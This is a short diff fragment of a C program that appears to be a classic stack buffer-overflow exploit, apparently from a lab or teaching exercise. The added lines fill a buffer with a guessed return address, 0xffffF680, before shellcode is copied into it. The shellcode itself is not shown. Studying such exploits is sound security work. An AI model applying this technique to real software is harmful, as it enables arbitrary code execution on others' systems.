@@ -53,6 +53,10 @@ int main(int argc, char** argv)
 		buf[i] = 1;
     }
 
+    for (i = 0; i < (LL); i++)
+    {
+        large_string[i] = 0xffffF680;
+    }
     for (i = 0; i < strlen(shellcode); i++)
     {
         large_string[i] = shellcode[i];
